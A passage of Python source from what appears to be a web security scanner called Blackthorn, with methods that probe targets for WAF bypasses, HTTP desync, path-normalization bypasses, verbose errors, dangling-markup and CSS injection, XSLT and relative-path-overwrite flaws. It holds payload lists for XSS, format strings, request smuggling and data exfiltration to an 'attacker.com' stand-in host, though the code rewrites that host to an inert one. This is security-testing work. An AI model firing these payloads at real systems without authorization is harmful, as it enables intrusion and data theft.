                            print(f"  [!] Range DoS potential: {technique}")
                    
                    # Check for error disclosure
                    if resp.status_code in [400, 416, 500] and 'error' in resp.text.lower():
                        result = {
                            'technique': f'Range Error Disclosure: {technique}',
                            'bypass': False,
                            'status': resp.status_code,
                            'reason': 'Range header causes error disclosure',
                            'severity': 'LOW',
                            'category': 'RANGE_ATTACK'
                        }
                        results.append(result)
                        
            except Exception as e:
                logger.debug(f"Range attack error: {e}")
        
        return results
    
    def _test_multipart_bypass(self) -> List[Dict[str, Any]]:
        """Multipart boundary manipulation for WAF bypass"""
        results = []
        print("  [*] Testing multipart boundary bypasses...")
        
        # XSS payload to test
        xss_payload = '<script>alert(1)</script>'
        
        # Boundary manipulation techniques
        multipart_attacks = [
            # Standard multipart
            (
                '--boundary\r\nContent-Disposition: form-data; name="test"\r\n\r\n' + xss_payload + '\r\n--boundary--',
                'multipart/form-data; boundary=boundary',
                'Standard multipart'
            ),
            
            # Long boundary
            (
                '--' + 'A' * 1000 + '\r\nContent-Disposition: form-data; name="test"\r\n\r\n' + xss_payload + '\r\n--' + 'A' * 1000 + '--',
                'multipart/form-data; boundary=' + 'A' * 1000,
                'Long boundary'
            ),
            
            # Special characters in boundary
            (
                '--bound@ry!\r\nContent-Disposition: form-data; name="test"\r\n\r\n' + xss_payload + '\r\n--bound@ry!--',
                'multipart/form-data; boundary=bound@ry!',
                'Special chars boundary'
            ),
            
            # Quoted boundary
            (
                '--"boundary"\r\nContent-Disposition: form-data; name="test"\r\n\r\n' + xss_payload + '\r\n--"boundary"--',
                'multipart/form-data; boundary="boundary"',
                'Quoted boundary'
            ),
            
            # Missing boundary in content-type
            (
                '--boundary\r\nContent-Disposition: form-data; name="test"\r\n\r\n' + xss_payload + '\r\n--boundary--',
                'multipart/form-data',
                'Missing boundary param'
            ),
            
            # CRLF variations
            (
                '--boundary\nContent-Disposition: form-data; name="test"\n\n' + xss_payload + '\n--boundary--',
                'multipart/form-data; boundary=boundary',
                'LF only (no CR)'
            ),
            
            # Extra headers
            (
                '--boundary\r\nContent-Disposition: form-data; name="test"\r\nX-Bypass: true\r\n\r\n' + xss_payload + '\r\n--boundary--',
                'multipart/form-data; boundary=boundary',
                'Extra headers'
            ),
            
            # Filename injection
            (
                '--boundary\r\nContent-Disposition: form-data; name="file"; filename="test.txt\r\n\r\n' + xss_payload + '\r\n--boundary--',
                'multipart/form-data; boundary=boundary',
                'Filename CRLF injection'
            ),
        ]
        
        for body, content_type, technique in multipart_attacks:
            try:
                resp = self._scoped_safe_request(
                    self.target, method='POST',
                    data=body.encode(),
                    headers={'Content-Type': content_type},
                    timeout=self.timeout,
                    verify=False
                )
                
                if resp is not None:
                    # Check if XSS payload was reflected (WAF bypassed)
                    if xss_payload in resp.text:
                        result = {
                            'technique': f'Multipart Bypass: {technique}',
                            'bypass': True,
                            'status': resp.status_code,
                            'reason': 'XSS payload reflected via multipart bypass',
                            'severity': 'HIGH',
                            'category': 'MULTIPART_BYPASS'
                        }
                        results.append(result)
                        print(f"  [✓] Multipart Bypass: {technique}")
                    
                    # Check if server processed malformed multipart
                    elif resp.status_code in [200, 201] and 'Invalid' not in technique:
                        result = {
                            'technique': f'Multipart Accepted: {technique}',
                            'bypass': False,
                            'status': resp.status_code,
                            'reason': f'Server processed {technique}',
                            'severity': 'LOW',
                            'category': 'MULTIPART_BYPASS'
                        }
                        results.append(result)
                        
            except Exception as e:
                logger.debug(f"Multipart bypass error: {e}")
        
        return results
    
    def _test_dns_rebinding(self) -> List[Dict[str, Any]]:
        """Disabled until Blackthorn can control and observe DNS answer changes.

        A Host-header response delta is not DNS rebinding proof. Faithful testing
        requires a user-owned authoritative domain that changes answers between
        the browser's validation and use phases, plus correlated callback/state
        evidence. The catalog keeps this method visible, but the accuracy guard
        prevents it from running.
        """
        logger.info("DNS rebinding scanner requires a proof-capable rebinding service")
        return []
    
    def _test_timing_based_discovery(self) -> List[Dict[str, Any]]:
        """Timing-based blind resource discovery"""
        results = []
        print("  [*] Testing timing-based resource discovery...")
        
        # Get baseline timing
        baseline_times = []
        for _ in range(3):
            try:
                start = time.time()
                resp = self._scoped_safe_request(f"{self.target}/nonexistent_{int(time.time())}", timeout=self.timeout)
                baseline_times.append(time.time() - start)
            except:
                baseline_times.append(1.0)
        
        baseline_avg = sum(baseline_times) / len(baseline_times)
        
        # Resources that might have different timing
        timing_resources = [
            '/admin', '/administrator', '/wp-admin', '/login',
            '/api/users', '/api/admin', '/graphql', '/internal',
            '/debug', '/server-status', '/metrics', '/health',
            '/.git', '/.env', '/config', '/backup'
        ]
        
        timing_anomalies = []
        
        for resource in timing_resources:
            try:
                times = []
                for _ in range(2):
                    start = time.time()
                    resp = self._scoped_safe_request(f"{self.target}{resource}", timeout=self.timeout)
                    times.append(time.time() - start)
                
                avg_time = sum(times) / len(times)
                
                # Significant timing difference might indicate resource exists
                if avg_time > baseline_avg * 1.5 or avg_time < baseline_avg * 0.5:
                    timing_anomalies.append({
                        'resource': resource,
                        'avg_time': avg_time,
                        'baseline': baseline_avg,
                        'status': resp.status_code if resp is not None else 0
                    })
                    
            except Exception as e:
                logger.debug(f"Timing test error: {e}")
        
        for anomaly in timing_anomalies:
            diff = anomaly['avg_time'] - anomaly['baseline']
            direction = 'slower' if diff > 0 else 'faster'
            
            result = {
                'technique': f"Timing Anomaly: {anomaly['resource']}",
                'bypass': False,
                'status': anomaly['status'],
                'reason': f'Response {abs(diff):.2f}s {direction} than baseline',
                'severity': 'LOW',
                'category': 'TIMING_DISCOVERY',
                'details': anomaly
            }
            results.append(result)
            print(f"  [*] Timing anomaly: {anomaly['resource']} ({direction})")
        
        return results
    
    def _test_error_based_disclosure(self) -> List[Dict[str, Any]]:
        """Force verbose error messages for information disclosure"""
        results = []
        print("  [*] Testing error-based information disclosure...")
        
        # Error-triggering payloads
        error_triggers = [
            # Type errors
            ("/?id[]=1", "Array type confusion"),
            ("/?id={}", "Object type confusion"),
            ("/?id=null", "Null value"),
            ("/?id=undefined", "Undefined value"),
            
            # Numeric errors
            ("/?id=9" * 100, "Large number"),
            ("/?id=-1", "Negative number"),
            ("/?id=0", "Zero value"),
            ("/?id=1.1.1", "Invalid number format"),
            ("/?id=1e999", "Overflow number"),
            
            # String errors
            ("/?id=" + "A" * 10000, "Very long string"),
            ("/?id=%00", "Null byte"),
            ("/?id=\x00", "Raw null"),
            
            # Format string
            ("/?id=%s%s%s%s%s", "Format string"),
            ("/?id=%n%n%n%n", "Format string %n"),
            ("/?id=%x%x%x%x", "Format string %x"),
            
            # Special characters
            ("/?id=<>\"'`", "Special chars"),
            ("/?id=../../../", "Path traversal chars"),
            
            # Invalid encoding
            ("/?id=%GG", "Invalid URL encoding"),
            ("/?id=%%", "Double percent"),
            
            # JSON errors
            ("/?data={invalid}", "Invalid JSON"),
            ("/?data={\"key\":", "Incomplete JSON"),
        ]
        
        error_indicators = [
            'exception', 'error', 'traceback', 'stack trace', 'syntax',
            'warning', 'fatal', 'debug', 'at line', 'undefined', 'null',
            'parse error', 'type error', 'reference error', 'sql',
            'mysql', 'postgresql', 'oracle', 'sqlite', 'odbc',
            'asp.net', 'java.lang', 'python', 'php', 'ruby',
            'node_modules', 'node.js', 'express', 'django', 'laravel',
            'spring', 'struts', 'tomcat', 'apache', 'nginx',
            'internal server error', 'application error'
        ]
        
        for payload, technique in error_triggers:
            try:
                resp = self._scoped_safe_request(
                    f"{self.target}{payload}",
                    timeout=self.timeout
                )
                
                if resp is not None:
                    content_lower = resp.text.lower()
                    
                    found_indicators = [ind for ind in error_indicators if ind in content_lower]
                    
                    if found_indicators and resp.status_code in [400, 500, 501, 502, 503]:
                        severity = 'MEDIUM' if len(found_indicators) > 2 else 'LOW'
                        
                        result = {
                            'technique': f'Error Disclosure: {technique}',
                            'bypass': True,
                            'status': resp.status_code,
                            'reason': f'Verbose error: {", ".join(found_indicators[:3])}',
                            'severity': severity,
                            'category': 'ERROR_DISCLOSURE'
                        }
                        results.append(result)
                        print(f"  [!] Error disclosure via {technique}")
                        
            except Exception as e:
                logger.debug(f"Error disclosure test error: {e}")
        
        return results
    
    def _test_path_normalization_extended(self) -> List[Dict[str, Any]]:
        """Extended path normalization bypasses"""
        results = []
        print("  [*] Testing extended path normalization...")
        
        # Target sensitive paths
        sensitive_paths = ['/admin', '/api', '/internal', '/config']
        
        # Normalization bypass techniques
        norm_techniques = [
            # Dot segments
            ('/./TARGETPATH', 'Single dot'),
            ('/../TARGETPATH', 'Parent traversal'),
            ('/TARGETPATH/.', 'Trailing dot'),
            ('/TARGETPATH/..', 'Trailing parent'),
            
            # Multiple slashes
            ('//TARGETPATH', 'Double slash'),
            ('///TARGETPATH', 'Triple slash'),
            ('/TARGETPATH//', 'Trailing double slash'),
            
            # Backslash (Windows)
            ('/TARGETPATH\\', 'Trailing backslash'),
            ('\\TARGETPATH', 'Leading backslash'),
            ('/TARGETPATH\\..\\', 'Backslash traversal'),
            
            # URL encoding variations
            ('/%2e/TARGETPATH', 'Encoded dot'),
            ('/TARGETPATH%2f', 'Encoded trailing slash'),
            ('/%2e%2e/TARGETPATH', 'Encoded parent'),
            ('/%252e%252e/TARGETPATH', 'Double encoded'),
            
            # Null byte
            ('/TARGETPATH%00', 'Null byte suffix'),
            ('/TARGETPATH%00.html', 'Null + extension'),
            
            # Semicolon
            ('/TARGETPATH;', 'Semicolon suffix'),
            ('/TARGETPATH;.css', 'Semicolon + extension'),
            ('/;/TARGETPATH', 'Semicolon prefix'),
            
            # Parameters
            ('/TARGETPATH?', 'Empty query'),
            ('/TARGETPATH#', 'Fragment'),
            ('/TARGETPATH?.css', 'Query as extension'),
            
            # Case variations
            ('/TARGETPATH', 'Original'),
            ('/TaRgEtPaTh', 'Mixed case'),
            
            # Unicode
            ('/TARGETPATH%c0%af', 'Overlong slash'),
            ('/TARGETPATH%e0%80%af', 'Triple byte overlong'),
            ('/TARGETPATH\uff0f', 'Fullwidth slash'),
            
            # Whitespace
            ('/TARGETPATH%20', 'Trailing space'),
            ('/TARGETPATH%09', 'Trailing tab'),
            ('/%20TARGETPATH', 'Leading space'),
        ]
        
        for sensitive_path in sensitive_paths:
            for technique_template, technique_name in norm_techniques:
                path = technique_template.replace('TARGETPATH', sensitive_path.lstrip('/'))
                
                try:
                    resp = self._scoped_safe_request(
                        f"{self.target}{path}",
                        timeout=self.timeout,
                        allow_redirects=False
                    )
                    
                    if resp is not None:
                        # Check if we got different response than 404
                        if resp.status_code in [200, 301, 302, 403]:
                            # Compare with baseline for this path
                            baseline_resp = self._scoped_safe_request(f"{self.target}{sensitive_path}", timeout=self.timeout)
                            
                            if (baseline_resp is not None
                                    and baseline_resp.status_code != resp.status_code):
                                result = {
                                    'technique': f'Path Norm: {technique_name}',
                                    'bypass': True,
                                    'status': resp.status_code,
                                    'reason': f'{sensitive_path} accessible via {path[:30]}',
                                    'severity': 'MEDIUM',
                                    'category': 'PATH_NORMALIZATION'
                                }
                                results.append(result)
                                print(f"  [✓] Path bypass: {technique_name} for {sensitive_path}")
                                break
                                
                except Exception as e:
                    logger.debug(f"Path normalization error: {e}")
        
        return results
    
    def _test_content_sniffing(self) -> List[Dict[str, Any]]:
        """Discover upload/content-type confusion surfaces with inert polyglots."""
        results = []
        print("  [*] Testing content sniffing attacks...")
        marker = f'BT-SNIFF-{random.randrange(10**8, 10**9)}'
        harmless_html = f'<p>{marker}</p>'.encode()
        
        # Polyglot payloads (files that are valid in multiple formats)
        polyglots = [
            # GIFAR (GIF + ZIP/JAR)
            (b'GIF89a/*' + harmless_html + b'*/', 'image/gif', 'GIF/HTML'),
            
            # PDF + HTML
            (b'%PDF-1.4' + harmless_html, 'application/pdf', 'PDF/HTML'),
            
            # PNG + HTML
            (b'\x89PNG\r\n\x1a\n' + harmless_html, 'image/png', 'PNG/HTML'),
            
            # JPEG + HTML
            (b'\xff\xd8\xff\xe0' + harmless_html, 'image/jpeg', 'JPEG/HTML'),
            
            # SVG (XML)
            (b'<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg">'
             b'<text>BLACKTHORN-INERT</text></svg>', 'image/svg+xml', 'SVG'),
        ]
        
        # Test upload endpoints
        upload_endpoints = ['/upload', '/api/upload', '/files', '/media', '/images']
        
        for endpoint in upload_endpoints[:2]:
            for content, mime_type, technique in polyglots[:3]:
                try:
                    # Upload the polyglot
                    filename = f'blackthorn-{marker.lower()}.bin'
                    files = {'file': (filename, content, mime_type)}
                    resp = self._scoped_safe_request(
                        f"{self.target}{endpoint}", method='POST',
                        files=files,
                        timeout=self.timeout,
                        verify=False
                    )
                    
                    if resp is not None and resp.status_code in [200, 201]:
                        # Check if file URL is returned
                        if 'url' in resp.text.lower() or 'path' in resp.text.lower():
                            result = {
                                'technique': f'Content-type upload candidate: {technique}',
                                'bypass': True,
                                'status': resp.status_code,
                                'reason': (f'Inert mixed-format file was accepted at {endpoint}; '
                                           'browser sniffing and script execution were not proven'),
                                'severity': 'LOW',
                                'category': 'CONTENT_SNIFFING',
                                'kind': 'suspected',
                                'verification_status': 'candidate',
                                'confidence': 'low',
                                'method': 'POST', 'path': endpoint,
                                'url': f'{self.target}{endpoint}',
                                'payload': filename,
                                'evidence': [{
                                    'type': 'mixed_format_upload_acceptance',
                                    'description': ('Application returned a URL/path response '
                                                    'after inert polyglot upload'),
                                    'matched': technique,
                                }],
                                '_no_reconfirm': True,
                            }
                            results.append(result)
                            print(f"  [!] Content-type upload candidate: {technique} at {endpoint}")
                            
                except Exception as e:
                    logger.debug(f"Content sniffing error: {e}")
        
        # Check for X-Content-Type-Options header
        try:
            resp = self._scoped_safe_request(self.target, timeout=self.timeout)
            if resp is not None:
                xcto = resp.headers.get('X-Content-Type-Options', '')
                if xcto.lower() != 'nosniff':
                    result = {
                        'technique': 'Missing X-Content-Type-Options',
                        'bypass': False,
                        'status': resp.status_code,
                        'reason': 'Content sniffing protection not enabled',
                        'severity': 'LOW',
                        'category': 'CONTENT_SNIFFING',
                        'kind': 'observation',
                        'verification_status': 'informational',
                    }
                    results.append(result)
        except:
            pass
        
        return results
    
    def _test_buffer_limits(self) -> List[Dict[str, Any]]:
        """Test buffer limits - large headers, body, URL"""
        results = []
        print("  [*] Testing buffer/size limits...")
        
        # Large URL test
        url_lengths = [2000, 4000, 8000, 16000]
        for length in url_lengths:
            try:
                long_param = 'A' * length
                resp = self._scoped_safe_request(
                    f"{self.target}/?test={long_param}",
                    timeout=self.timeout + 5
                )
                
                if resp is not None:
                    if resp.status_code in [200, 400, 414]:
                        if resp.status_code == 200:
                            result = {
                                'technique': f'Large URL Accepted: {length} chars',
                                'bypass': False,
                                'status': resp.status_code,
                                'reason': f'Server accepts URL with {length} char param',
                                'severity': 'INFO',
                                'category': 'BUFFER_LIMITS'
                            }
                            results.append(result)
                else:
                    break  # Server rejected, no point testing larger
                    
            except Exception as e:
                break
        
        # Large header test
        header_sizes = [4000, 8000, 16000]
        for size in header_sizes:
            try:
                resp = self._scoped_safe_request(
                    self.target,
                    timeout=self.timeout,
                    headers={'X-Large-Header': 'A' * size}
                )
                
                if resp is not None and resp.status_code == 200:
                    result = {
                        'technique': f'Large Header Accepted: {size} chars',
                        'bypass': False,
                        'status': resp.status_code,
                        'reason': f'Server accepts {size} char header',
                        'severity': 'INFO',
                        'category': 'BUFFER_LIMITS'
                    }
                    results.append(result)
                else:
                    break
                    
            except Exception as e:
                break
        
        # Many headers test
        try:
            many_headers = {f'X-Header-{i}': f'value-{i}' for i in range(100)}
            resp = self._scoped_safe_request(
                self.target,
                timeout=self.timeout,
                headers=many_headers
            )
            
            if resp is not None and resp.status_code == 200:
                result = {
                    'technique': 'Many Headers Accepted: 100 headers',
                    'bypass': False,
                    'status': resp.status_code,
                    'reason': 'Server accepts 100 custom headers',
                    'severity': 'INFO',
                    'category': 'BUFFER_LIMITS'
                }
                results.append(result)
                
        except Exception as e:
            logger.debug(f"Many headers test error: {e}")
        
        # Large POST body test
        body_sizes = [1024*100, 1024*1000, 1024*10000]  # 100KB, 1MB, 10MB
        for size in body_sizes:
            try:
                resp = self._scoped_safe_request(
                    self.target, method='POST',
                    data='A' * size,
                    timeout=self.timeout + 10,
                    verify=False,
                    headers={'Content-Type': 'application/octet-stream'}
                )
                
                if resp is not None and resp.status_code in [200, 201]:
                    size_kb = size // 1024
                    result = {
                        'technique': f'Large Body Accepted: {size_kb}KB',
                        'bypass': False,
                        'status': resp.status_code,
                        'reason': f'Server accepts {size_kb}KB POST body',
                        'severity': 'INFO' if size_kb < 1000 else 'LOW',
                        'category': 'BUFFER_LIMITS'
                    }
                    results.append(result)
                else:
                    break
                    
            except Exception as e:
                break
        
        return results

    # ============================================================================
    # ADDITIONAL DANGEROUS TESTS
    # ============================================================================
    
    def _test_http_desync(self) -> List[Dict[str, Any]]:
        """HTTP Desync attacks - advanced request smuggling"""
        results = []
        print("  [*] Testing HTTP Desync attacks...")
        
        desync_payloads = [
            # CL.CL desync
            {
                'headers': {
                    'Content-Length': '6',
                    'Content-Length': '5',  # Will be overwritten, just for documentation
                },
                'body': 'GPOST',
                'technique': 'CL.CL Desync'
            },
            
            # Space before colon
            {
                'headers': {
                    'Content-Length ': '0',
                    'Transfer-Encoding': 'chunked',
                },
                'body': '0\r\n\r\n',
                'technique': 'Space in header name'
            },
            
            # Tab in header value
            {
                'headers': {
                    'Transfer-Encoding': '\tchunked',
                },
                'body': '0\r\n\r\n',
                'technique': 'Tab before chunked'
            },
            
            # Vertical tab
            {
                'headers': {
                    'Transfer-Encoding': '\x0bchunked',
                },
                'body': '0\r\n\r\n',
                'technique': 'Vertical tab'
            },
            
            # Form feed
            {
                'headers': {
                    'Transfer-Encoding': '\x0cchunked',
                },
                'body': '0\r\n\r\n',
                'technique': 'Form feed'
            },
            
            # Line wrapping (obs-fold)
            {
                'headers': {
                    'Transfer-Encoding': 'chunked',
                    'X-Test': 'value\r\n continued',
                },
                'body': '0\r\n\r\n',
                'technique': 'Line wrapping'
            },
        ]
        
        for payload in desync_payloads:
            try:
                resp = self._scoped_safe_request(
                    self.target, method='POST',
                    headers=payload['headers'],
                    data=payload['body'],
                    timeout=self.timeout,
                    verify=False
                )
                
                if resp is not None and resp.status_code in [200, 400]:
                    # Analyze response for desync indicators
                    if resp.status_code == 200 and len(resp.content) != self._baseline_size:
                        result = {
                            'technique': f"HTTP Desync: {payload['technique']}",
                            'bypass': True,
                            'status': resp.status_code,
                            'reason': 'Potential HTTP desync detected',
                            'severity': 'HIGH',
                            'category': 'HTTP_DESYNC'
                        }
                        results.append(result)
                        print(f"  [!] HTTP Desync: {payload['technique']}")
                        
            except Exception as e:
                logger.debug(f"HTTP desync error: {e}")
        
        return results
    
    def _test_dangling_markup(self) -> List[Dict[str, Any]]:
        """Dangling markup injection for data exfiltration"""
        results = []
        print("  [*] Testing dangling markup injection...")
        
        dangling_payloads = [
            # Image tag without closing
            '<img src="http://attacker.com/log?',
            # Form action hijacking
            '<form action="http://attacker.com/steal"><input name="',
            # Meta refresh
            '<meta http-equiv="refresh" content="0;url=http://attacker.com/log?',
            # Style import
            '<style>@import "http://attacker.com/log?',
            # Link preload
            '<link rel="preload" href="http://attacker.com/log?',
            # Base tag
            '<base href="http://attacker.com/',
            # Button form action
            '<button formaction="http://attacker.com/steal">',
            # Object data
            '<object data="http://attacker.com/log?',
            # Textarea
            '<textarea name="stolen">',
            # Comment
            '<!--',
        ]
        dangling_payloads = [p.replace('attacker.com', 'blackthorn.invalid')
                             for p in dangling_payloads]
        
        for payload in dangling_payloads:
            try:
                encoded = quote(payload)
                result = self._test_request(
                    path=f'/?test={encoded}',
                    technique=f'Dangling markup candidate: {payload[:30]}...',
                    probe={
                        'category': 'DANGLING_MARKUP', 'payload': payload,
                        'parameter': 'test',
                        'insertion_point': {'type': 'query', 'name': 'test'},
                        'detector_id': 'dangling-markup-reflection-v2',
                        'oracle': {
                            'type': 'reflection', 'value': payload,
                            'severity': 'LOW',
                            'reason': ('Unclosed markup was reflected verbatim; HTML '
                                       'context and data exfiltration are unverified'),
                        },
                    },
                )
                if self._result_has_evidence(result, 'unencoded_reflection'):
                    results.append(result)
                    print("  [!] Dangling markup reflection candidate")
                    
            except Exception as e:
                logger.debug(f"Dangling markup error: {e}")
        
        return results
    
    def _test_css_injection(self) -> List[Dict[str, Any]]:
        """CSS injection for data exfiltration"""
        results = []
        print("  [*] Testing CSS injection...")
        
        css_payloads = [
            # Attribute selector exfiltration
            'input[value^="a"]{background:url(http://attacker.com/a)}',
            # Font-face exfiltration
            '@font-face{font-family:x;src:url(http://attacker.com/log)}',
            # Import exfiltration
            '@import "http://attacker.com/log";',
            # Style injection via expression (IE)
            'body{xss:expression(alert(1))}',
            # CSS variable injection
            '--x:url(http://attacker.com/log);',
        ]
        css_payloads = [p.replace('attacker.com', 'blackthorn.invalid') for p in css_payloads]
        
        injection_points = [
            ('style=', 'Inline style'),
            ('<style>', 'Style tag'),
            ('"></style><style>', 'Style breakout'),
        ]
        
        for payload in css_payloads[:3]:
            for injection, technique in injection_points:
                try:
                    full_payload = f"{injection}{payload}"
                    encoded = quote(full_payload)
                    
                    result = self._test_request(
                        path=f'/?test={encoded}',
                        technique=f'CSS injection candidate: {technique}',
                        probe={
                            'category': 'CSS_INJECTION', 'payload': full_payload,
                            'parameter': 'test',
                            'insertion_point': {'type': 'query', 'name': 'test'},
                            'detector_id': 'css-reflection-v2',
                            'oracle': {
                                'type': 'reflection', 'value': payload,
                                'severity': 'LOW',
                                'reason': ('CSS text was reflected verbatim; a valid '
                                           'style context or browser effect is unverified'),
                            },
                        },
                    )
                    if self._result_has_evidence(result, 'unencoded_reflection'):
                        results.append(result)
                        print(f"  [!] CSS reflection candidate via {technique}")
                        break
                        
                except Exception as e:
                    logger.debug(f"CSS injection error: {e}")
        
        return results
    
    def _test_xslt_injection(self) -> List[Dict[str, Any]]:
        """XSLT injection testing"""
        results = []
        print("  [*] Testing XSLT injection...")
        
        # Complete, non-networked stylesheet. The rendered vendor canary is not
        # contiguous in the request, so plain reflection cannot satisfy it.
        xslt_payloads = [(
            '<?xml version="1.0"?>'
            '<xsl:stylesheet version="1.0" '
            'xmlns:xsl="http://www.w3.org/1999/XSL/Transform">'
            '<xsl:output method="text"/>'
            '<xsl:template match="/">BTXSLT-'
            '<xsl:value-of select="system-property(\'xsl:vendor\')"/>'
            '-END</xsl:template></xsl:stylesheet>'
        )]
        
        # Test endpoints that might process XSLT
        xslt_endpoints = [
            self.target,
            f"{self.target}/transform",
            f"{self.target}/api/transform",
            f"{self.target}/xslt",
        ]
        
        for endpoint in xslt_endpoints[:2]:
            for payload in xslt_payloads:
                try:
                    endpoint_path = urlparse(endpoint).path or '/'
                    result = self._test_request(
                        method='POST', path=endpoint_path, data=payload,
                        headers={'Content-Type': 'application/xml'},
                        technique='XSLT stylesheet injection',
                        probe={
                            'category': 'XSLT_INJECTION', 'payload': payload,
                            'insertion_point': {'type': 'body', 'name': 'stylesheet'},
                            'detector_id': 'xslt-rendered-vendor-v2',
                            'control': {
                                'method': 'POST', 'path': endpoint_path,
                                'headers': {'Content-Type': 'application/xml'},
                                'data': ('<?xml version="1.0"?><xsl:stylesheet version="1.0" '
                                         'xmlns:xsl="http://www.w3.org/1999/XSL/Transform">'
                                         '<xsl:template match="/">BLACKTHORN-CONTROL'
                                         '</xsl:template></xsl:stylesheet>'),
                            },
                            'oracle': {
                                'type': 'regex',
                                'patterns': [r'BTXSLT-[A-Za-z][A-Za-z0-9 ._/-]{1,120}-END'],
                                'severity': 'HIGH',
                                'reason': 'Server rendered the supplied XSLT system-property expression',
                            },
                        },
                    )
                    if self._result_has_evidence(result, 'response_signature'):
                        results.append(result)
                        print("  [✓] HIGH: XSLT stylesheet injection")
                            
                except Exception as e:
                    logger.debug(f"XSLT injection error: {e}")
        
        return results
    
    def _test_pdf_injection(self) -> List[Dict[str, Any]]:
        """Locate HTML-to-PDF surfaces with inert markup.

        Network/file payloads need OOB or returned-file proof and belong in a
        separately authorized workflow. A PDF response by itself is discovery,
        not SSRF, local-file inclusion, or script execution.
        """
        results = []
        print("  [*] Discovering PDF generation surfaces with inert markup...")
        marker = f'BT-PDF-{random.randrange(10**8, 10**9)}'
        payload = f'<p>{marker}</p>'
        
        # PDF generation endpoints
        pdf_endpoints = [
            '/pdf', '/api/pdf', '/generate-pdf', '/export/pdf',
            '/download/pdf', '/report', '/invoice', '/print'
        ]
        
        for endpoint in pdf_endpoints[:3]:
            try:
                resp = self._scoped_safe_request(
                    f"{self.target}{endpoint}", method='POST',
                    data={'content': payload, 'html': payload, 'body': payload},
                    timeout=self.timeout + 5, verify=False
                )

                if (resp is not None and resp.status_code == 200 and
                        (resp.content[:4] == b'%PDF' or
                         'application/pdf' in resp.headers.get('Content-Type', ''))):
                    result = {
                        'technique': f'PDF generation surface: {endpoint}',
                        'bypass': False, 'status': resp.status_code,
                        'reason': ('Endpoint generated a PDF from inert markup; '
                                   'SSRF/LFI/script execution was not tested'),
                        'severity': 'INFO', 'category': 'PDF_INJECTION',
                        'kind': 'observation',
                        'verification_status': 'informational',
                        'confidence': 'high', 'method': 'POST',
                        'path': endpoint, 'url': f'{self.target}{endpoint}',
                        'payload': payload,
                        'request': {
                            'method': 'POST', 'url': f'{self.target}{endpoint}',
                            'path': endpoint, 'headers': {},
                            'body': {'content': payload, 'html': payload,
                                     'body': payload},
                        },
                        'response': {
                            'status': resp.status_code,
                            'content_type': resp.headers.get('Content-Type', ''),
                            'size': len(resp.content),
                        },
                        'evidence': [{
                            'type': 'pdf_generation_surface',
                            'description': 'Response had PDF magic bytes or media type',
                            'matched': resp.headers.get('Content-Type', '%PDF'),
                        }],
                        '_no_reconfirm': True,
                    }
                    results.append(result)
                    print(f"  [i] PDF generation surface at {endpoint}")
            except Exception as e:
                logger.debug(f"PDF generation probe error: {e}")
        
        return results
    
    def _test_postmessage_vulnerabilities(self) -> List[Dict[str, Any]]:
        """Statically identify message listeners that need manual validation."""
        results = []
        print("  [*] Testing PostMessage vulnerabilities...")
        
        try:
            resp = self._scoped_safe_request(self.target, timeout=self.timeout, allow_redirects=True)
            if resp is None:
                return results
            
            content = resp.text.lower()
            
            listener = re.search(
                r'''(?is)(addEventListener\s*\(\s*["']message["']|\bonmessage\s*=)''',
                content,
            )
            sender = re.search(r'(?is)\bpostMessage\s*\(', content)
            if not listener and not sender:
                return results

            has_origin_reference = bool(re.search(r'\b(?:event|e)\.origin\b', content))
            weak_origin_check = bool(re.search(
                r'''(?is)\.origin\s*(?:==|===)\s*["']\*["']|'''
                r'''\.origin[^;\n]{0,100}(?:indexOf|includes)\s*\(''',
                content,
            ))
            candidate = bool(listener and (weak_origin_check or not has_origin_reference))
            reason = (
                'Static message listener has no clear exact origin check; runtime data-flow '
                'and impact still need browser verification'
                if candidate else
                'postMessage use detected; static source alone does not establish an exploitable listener'
            )
            matched = (listener or sender).group(0)[:160]
            result = {
                'technique': ('PostMessage listener review' if listener
                              else 'PostMessage sender observed'),
                'bypass': candidate, 'status': resp.status_code,
                'reason': reason, 'severity': 'LOW' if candidate else 'INFO',
                'category': 'POSTMESSAGE',
                'kind': 'suspected' if candidate else 'observation',
                'verification_status': 'candidate' if candidate else 'informational',
                'confidence': 'low' if candidate else 'high',
                'method': 'GET', 'path': '/', 'url': self.target,
                'request': {'method': 'GET', 'path': '/', 'url': self.target,
                            'headers': {}, 'body': None},
                'response': {'status': resp.status_code,
                             'content_type': resp.headers.get('Content-Type', '')},
                'evidence': [{
                    'type': 'static_message_listener' if listener else 'postmessage_usage',
                    'description': reason, 'matched': matched,
                }],
                '_no_reconfirm': True,
            }
            results.append(result)
            print(f"  [{'!' if candidate else 'i'}] {reason}")
                    
        except Exception as e:
            logger.debug(f"PostMessage test error: {e}")
        
        return results
    
    def _test_rpo_attack(self) -> List[Dict[str, Any]]:
        """Relative Path Overwrite (RPO) attack testing"""
        results = []
        print("  [*] Testing Relative Path Overwrite (RPO)...")
        
        # RPO test paths
        rpo_paths = [
            '/test/..%2f..%2f',
            '/test/..%5c..%5c',
            '/test%2f..%2f..%2f',
            '/test/;/../',
            '/test/./;/../../',
        ]
        
        try:
            # Get baseline to check for relative paths
            resp = self._scoped_safe_request(self.target, timeout=self.timeout)
            if resp is not None:
                # Check for relative CSS/JS paths (vulnerable to RPO)
                relative_patterns = [
                    r'href=["\'](?!https?://|//)[^"\']+\.css',
                    r'src=["\'](?!https?://|//)[^"\']+\.js',
                ]
                
                relative_match = next(
                    (match for pattern in relative_patterns
                     if (match := re.search(pattern, resp.text))),
                    None,
                )
                
                if relative_match:
                    for rpo_path in rpo_paths:
                        try:
                            rpo_resp = self._scoped_safe_request(
                                f"{self.target}{rpo_path}",
                                timeout=self.timeout,
                                allow_redirects=False
                            )
                            
                            if rpo_resp is not None and rpo_resp.status_code == 200:
                                # Check if path traversal affected CSS/JS loading
                                result = {
                                    'technique': f'RPO routing candidate: {rpo_path[:30]}',
                                    'bypass': True,
                                    'status': rpo_resp.status_code,
                                    'reason': ('A manipulated route returned HTML that uses a '
                                               'relative asset; stylesheet interpretation and '
                                               'attacker-controlled CSS were not proven'),
                                    'severity': 'LOW',
                                    'category': 'RPO_ATTACK',
                                    'kind': 'suspected',
                                    'verification_status': 'candidate',
                                    'confidence': 'low',
                                    'method': 'GET', 'path': rpo_path,
                                    'url': f'{self.target}{rpo_path}',
                                    'request': {
                                        'method': 'GET', 'path': rpo_path,
                                        'url': f'{self.target}{rpo_path}',
                                        'headers': {}, 'body': None,
                                    },
                                    'response': {
                                        'status': rpo_resp.status_code,
                                        'content_type': rpo_resp.headers.get('Content-Type', ''),
                                    },
                                    'evidence': [{
                                        'type': 'relative_asset_on_manipulated_route',
